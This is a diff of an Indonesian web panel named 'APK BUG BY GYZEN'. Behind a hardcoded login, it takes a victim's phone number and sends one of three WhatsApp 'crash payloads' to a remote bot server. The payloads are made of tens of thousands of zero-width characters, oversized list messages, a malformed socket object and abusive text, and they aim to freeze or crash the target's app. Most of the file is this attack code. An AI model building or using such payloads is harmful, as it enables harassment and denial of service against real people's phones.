@@ -2,265 +2,397 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>APK BUG BY GYZEN</title>
   <style>
+    :root {
+      --primary: #1e90ff;
+      --primary-dark: #005bb5;
+      --danger: #ff4444;
+      --danger-dark: #cc0000;
+    }
+
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Arial, sans-serif;
       background: url('https://files.catbox.moe/mp9vqc.jpg') no-repeat center center fixed;
       background-size: cover;
       color: white;
       text-align: center;
-      padding: 60px 20px;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
     }
 
     h1 {
-      font-size: 80px;
+      font-size: clamp(40px, 6vw, 80px);
       font-weight: bold;
-      margin-bottom: 80px;
+      margin-bottom: 40px;
       text-shadow: 4px 4px 12px #000;
     }
 
-    input[type="text"], input[type="password"] {
-      padding: 25px;
-      font-size: 40px;
-      width: 95%;
-      max-width: 700px;
-      border-radius: 15px;
-      border: none;
-      margin-bottom: 40px;
-      text-align: center;
-      box-shadow: 0 0 15px #000;
+    .container {
+      background-color: rgba(0, 0, 0, 0.7);
+      border-radius: 20px;
+      padding: 30px;
+      max-width: 800px;
+      width: 90%;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
     }
 
-    .button-group button, .login-box button {
-      margin: 25px;
-      padding: 25px 60px;
-      font-size: 45px;
+    input[type="text"], input[type="password"] {
+      padding: 20px;
+      font-size: clamp(18px, 3vw, 24px);
+      width: 100%;
+      border-radius: 10px;
+      border: none;
+      margin-bottom: 20px;
+      text-align: center;
+      box-shadow: 0 0 10px #000;
+    }
+
+    .button-group {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    button {
+      padding: 15px 30px;
+      font-size: clamp(16px, 2.5vw, 20px);
       font-weight: bold;
       border: none;
-      border-radius: 20px;
-      background-color: #1e90ff;
+      border-radius: 10px;
       color: white;
       cursor: pointer;
-      box-shadow: 4px 4px 12px #000;
-      transition: background 0.3s, transform 0.2s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      transition: all 0.3s;
+      flex: 1 1 200px;
     }
 
-    .button-group button:hover, .login-box button:hover {
-      background-color: #005bb5;
-      transform: scale(1.1);
+    .btn-primary {
+      background-color: var(--primary);
+    }
+
+    .btn-primary:hover {
+      background-color: var(--primary-dark);
+      transform: translateY(-2px);
+    }
+
+    .btn-danger {
+      background-color: var(--danger);
+    }
+
+    .btn-danger:hover {
+      background-color: var(--danger-dark);
+      transform: translateY(-2px);
     }
 
     .hidden {
-      display: none;
+      display: none !important;
     }
 
-    /* Tombol Logout di kanan atas */
     #logoutBtn {
-      position: absolute;
+      position: fixed;
       top: 20px;
       right: 20px;
-      font-size: 30px;
-      padding: 15px 30px;
-      background-color: red;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
+      padding: 10px 20px;
+    }
+
+    .loader {
+      border: 5px solid rgba(255, 255, 255, 0.3);
+      border-top: 5px solid var(--primary);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
       display: none;
-      box-shadow: 3px 3px 10px #000;
     }
 
-    #logoutBtn:hover {
-      background-color: darkred;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
+    #status {
+      font-size: clamp(16px, 2.5vw, 20px);
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 10px;
+      background-color: rgba(0, 0, 0, 0.5);
+    }
+
+    .success {
+      color: #4CAF50;
+    }
+
+    .error {
+      color: #FF5252;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 15px;
+      }
+      
+      button {
+        padding: 12px 20px;
+      }
+    }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h1>APK BUG BY GYZEN</h1>
 
-  <h1>APK BUG BY GYZEN</h1>
+    <button id="logoutBtn" class="btn-danger hidden" onclick="logout()">LOG OUT</button>
 
-  <!-- Tombol Logout -->
-  <button id="logoutBtn" onclick="logout()">LOG OUT</button>
-
-  <!-- Login Form -->
-  <div class="login-box" id="loginBox">
-    <input type="text" id="username" placeholder="Username"><br>
-    <input type="password" id="password" placeholder="Password"><br>
-    <button onclick="login()">LOGIN</button>
-  </div>
-
-  <!-- Main APK Bug Form -->
-  <div id="mainContent" class="hidden">
-    <input type="text" id="nomor" placeholder="Masukkan Nomor Target"><br>
-    <div class="button-group">
-      <button onclick="kirimKeBot('FORCE')">FORCE</button>
-      <button onclick="kirimKeBot('DELAY')">DELAY</button>
-      <button onclick="kirimKeBot('INVIS')">INVIS</button>
+    <div id="loginBox">
+      <input type="text" id="username" placeholder="Username" autocomplete="off">
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+      <button class="btn-primary" onclick="login()">LOGIN</button>
     </div>
-    <div id="status" style="font-size: 35px; margin-top: 40px;"></div>
+
+    <div id="mainContent" class="hidden">
+      <input type="text" id="nomor" placeholder="Contoh: 6281234567890" autocomplete="off">
+      <div class="button-group">
+        <button class="btn-primary" onclick="kirimKeBot('FORCE')">FORCE</button>
+        <button class="btn-primary" onclick="kirimKeBot('DELAY')">DELAY</button>
+        <button class="btn-primary" onclick="kirimKeBot('INVIS')">INVIS</button>
+      </div>
+      <div class="loader" id="loader"></div>
+      <div id="status"></div>
+    </div>
   </div>
 
   <script>
+    // Konfigurasi
+    const API_ENDPOINT = "http://yuji-priv.ashura.my.id:3000/send";
+    const API_KEY = "rahasia123"; // Harus sama dengan di server
+
+    // Inisialisasi
+    document.addEventListener('DOMContentLoaded', () => {
+      if (localStorage.getItem('isLoggedIn') === 'true') {
+        showMainContent();
+      }
+    });
+
+    // Fungsi Login
     function login() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
+      const user = document.getElementById("username").value.trim();
+      const pass = document.getElementById("password").value.trim();
 
       if (user === "alwaysriky" && pass === "alwaysriky") {
-        document.getElementById("loginBox").style.display = "none";
-        document.getElementById("mainContent").classList.remove("hidden");
-        document.getElementById("logoutBtn").style.display = "inline-block";
+        localStorage.setItem('isLoggedIn', 'true');
+        showMainContent();
       } else {
-        alert("Login gagal! Username atau password salah.");
+        alert("Login gagal! Gunakan:\nUsername: alwaysriky\nPassword: alwaysriky");
       }
     }
 
+    // Fungsi Logout
     function logout() {
+      localStorage.removeItem('isLoggedIn');
+      document.getElementById("loginBox").classList.remove("hidden");
       document.getElementById("mainContent").classList.add("hidden");
-      document.getElementById("loginBox").style.display = "block";
-      document.getElementById("logoutBtn").style.display = "none";
+      document.getElementById("logoutBtn").classList.add("hidden");
+      document.getElementById("status").innerHTML = "";
     }
 
-    function kirimKeBot(mode) {
-      const nomor = document.getElementById("nomor").value;
-      const status = document.getElementById("status");
+    // Tampilkan konten utama
+    function showMainContent() {
+      document.getElementById("loginBox").classList.add("hidden");
+      document.getElementById("mainContent").classList.remove("hidden");
+      document.getElementById("logoutBtn").classList.remove("hidden");
+    }
 
-      if (!nomor) {
-        alert("Masukkan nomor terlebih dahulu!");
+    // Kirim data ke server
+    async function kirimKeBot(mode) {
+      const nomor = document.getElementById("nomor").value.trim();
+      const statusEl = document.getElementById("status");
+      const loader = document.getElementById("loader");
+
+      // Validasi input
+      if (!nomor || !nomor.match(/^\d{10,}$/)) {
+        statusEl.innerHTML = `<span class="error">Masukkan nomor valid (min 10 digit angka)</span>`;
         return;
       }
 
+      // Siapkan payload sesuai mode
       let payload;
-      
+      try {
+        payload = generatePayload(mode, nomor);
+      } catch (error) {
+        console.error("Error generating payload:", error);
+        statusEl.innerHTML = `<span class="error">Gagal membuat payload</span>`;
+        return;
+      }
+
+      // Tampilkan loader
+      loader.style.display = "block";
+      statusEl.innerHTML = `<span>🔄 Mengirim ${mode} ke ${nomor}...</span>`;
+
+      try {
+        const startTime = Date.now();
+        const response = await fetch(API_ENDPOINT, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Authorization": `Bearer ${API_KEY}`
+          },
+          body: JSON.stringify({ 
+            nomor: nomor, 
+            mode: mode,
+            payload: payload 
+          })
+        });
+
+        const result = await response.json();
+        const processingTime = Date.now() - startTime;
+
+        if (response.ok) {
+          statusEl.innerHTML = `
+            <span class="success">✅ ${result.message}</span><br>
+            <small>Mode: ${mode} | Nomor: ${nomor}</small><br>
+            <small>Waktu: ${processingTime}ms | Server: ${result.data?.server || 'N/A'}</small>
+          `;
+        } else {
+          statusEl.innerHTML = `
+            <span class="error">❌ ${result.message || 'Error tidak diketahui'}</span><br>
+            <small>Status: ${response.status}</small>
+          `;
+        }
+      } catch (error) {
+        console.error("Network error:", error);
+        statusEl.innerHTML = `
+          <span class="error">❌ Gagal terhubung ke server</span><br>
+          <small>${error.message}</small>
+        `;
+      } finally {
+        loader.style.display = "none";
+      }
+    }
+
+    // Fungsi pembuat payload
+    function generatePayload(mode, nomor) {
+      const basePayload = {
+        contextInfo: {
+          mentionedJid: [nomor],
+          forwardingScore: 999,
+          isForwarded: true,
+          externalAdReply: {
+            mediaType: 2,
+            thumbnailUrl: "https://files.catbox.moe/ri8m1p.jpg"
+          }
+        }
+      };
+
       switch(mode) {
         case 'FORCE':
-          payload = JSON.stringify({
-            status: true,
-            criador: "Yukina",
-            resultado: {
-              type: "md",
-              ws: {
-                _events: {
-                  "CB:ib,,dirty": ["Array"]
-                },
-                _eventsCount: 80000,
-                _maxListeners: 0,
-                url: "wss://web.whatsapp.com/ws/chat",
-                config: {
-                  version: ["Array"],
-                  browser: ["Array"],
-                  waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-                  sockCectTimeoutMs: 2000,
-                  keepAliveIntervalMs: 30000,
-                  logger: {},
-                  printQRInTerminal: false,
-                  emitOwnEvents: true,
-                  defaultQueryTimeoutMs: 6000,
-                  customUploadHosts: [],
-                  retryRequestDelayMs: 250,
-                  maxMsgRetryCount: 5,
-                  fireInitQueries: true,
-                  auth: { Object: "authData" },
-                  markOnlineOnsockCect: true,
-                  syncFullHistory: true,
-                  linkPreviewImageThumbnailWidth: 192,
-                  transactionOpts: { Object: "transactionOptsData" },
-                  generateHighQualityLinkPreview: false,
-                  options: {},
-                  appStateMacVerification: { Object: "appStateMacData" },
-                  mobile: true
+          return {
+            ...basePayload,
+            type: "FORCE",
+            data: {
+              status: true,
+              criador: "Yukina",
+              resultado: {
+                type: "md",
+                ws: {
+                  _events: { "CB:ib,,dirty": ["Array"] },
+                  _eventsCount: 80000,
+                  _maxListeners: 0,
+                  url: "wss://web.whatsapp.com/ws/chat",
+                  config: {
+                    version: ["Array"],
+                    browser: ["Array"],
+                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+                    sockCectTimeoutMs: 2000,
+                    keepAliveIntervalMs: 30000,
+                    logger: {},
+                    printQRInTerminal: false,
+                    emitOwnEvents: true,
+                    defaultQueryTimeoutMs: 6000,
+                    customUploadHosts: [],
+                    retryRequestDelayMs: 250,
+                    maxMsgRetryCount: 5,
+                    fireInitQueries: true,
+                    auth: { Object: "authData" },
+                    markOnlineOnsockCect: true,
+                    syncFullHistory: true,
+                    linkPreviewImageThumbnailWidth: 192,
+                    transactionOpts: { Object: "transactionOptsData" },
+                    generateHighQualityLinkPreview: false,
+                    options: {},
+                    appStateMacVerification: { Object: "appStateMacData" },
+                    mobile: true
+                  }
                 }
               }
             }
-          });
-          break;
-          
+          };
+
         case 'DELAY':
-          payload = JSON.stringify({
+          return {
+            ...basePayload,
             name: "single_select",
             params: {
               title: "\u200C".repeat(90000),
-              sections: [
-                {
-                  title: "\u200C".repeat(90000),
-                  rows: Array(50).fill().map(() => ({
-                    title: "\u200D".repeat(90000),
-                    description: "\u200D".repeat(90000),
-                    rowId: "\u200D".repeat(90000)
-                  }))
-                }
-              ],
+              sections: [{
+                title: "\u200C".repeat(90000),
+                rows: Array(50).fill().map(() => ({
+                  title: "\u200D".repeat(90000),
+                  description: "\u200D".repeat(90000),
+                  rowId: "\u200D".repeat(90000)
+                }))
+              }],
               contextInfo: {
-                mentionedJid: [nomor],
-                forwardingScore: 999,
-                isForwarded: true,
+                ...basePayload.contextInfo,
                 externalAdReply: {
+                  ...basePayload.contextInfo.externalAdReply,
                   title: "CRASH PAYLOAD",
                   body: "FUCK YOU" + "\u200E".repeat(90000),
-                  mediaType: 2,
-                  thumbnailUrl: "https://files.catbox.moe/ri8m1p.jpg",
                   sourceUrl: "https://t.me/infothedevil"
                 }
               }
             }
-          });
-          break;
-          
+          };
+
         case 'INVIS':
-          let WebThumb = `https://${"ꦾ".repeat(100)}.com/`;
-          payload = JSON.stringify({
+          const WebThumb = `https://${"ꦾ".repeat(100)}.com/`;
+          return {
+            ...basePayload,
             name: "single_select",
             params: {
               title: "\u200C".repeat(90000),
-              sections: [
-                {
-                  title: "\u200C".repeat(90000),
-                  rows: Array(50).fill().map(() => ({
-                    title: "\u200D".repeat(90000),
-                    description: "\u200D".repeat(90000),
-                    rowId: "\u200D".repeat(90000)
-                  }))
-                }
-              ],
+              sections: [{
+                title: "\u200C".repeat(90000),
+                rows: Array(50).fill().map(() => ({
+                  title: "\u200D".repeat(90000),
+                  description: "\u200D".repeat(90000),
+                  rowId: "\u200D".repeat(90000)
+                }))
+              }],
               contextInfo: {
-                mentionedJid: [nomor],
-                forwardingScore: 999,
-                isForwarded: true,
+                ...basePayload.contextInfo,
                 externalAdReply: {
+                  ...basePayload.contextInfo.externalAdReply,
                   title: "CRASH PAYLOAD",
                   body: "NESTED STRUCTURE" + "\u200E".repeat(90000),
-                  mediaType: 2,
-                  thumbnailUrl: "https://files.catbox.moe/ri8m1p.jpg",
                   sourceUrl: WebThumb
                 }
               }
             }
-          });
-          break;
-      }
+          };
 
-      // Contoh kirim data ke bot (ubah URL ke IP/server bot kamu)
-      fetch("http://yuji-priv.ashura.my.id:3000/send", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ 
-          nomor: nomor, 
-          mode: mode,
-          payload: payload 
-        })
-      })
-      .then(res => res.text())
-      .then(res => {
-        status.innerText = "✅ Berhasil dikirim ke bot!";
-      })
-      .catch(err => {
-        status.innerText = "❌ Gagal mengirim ke bot!";
-      });
+        default:
+          throw new Error("Mode tidak valid");
+      }
     }
   </script>
-
 </body>
 </html>
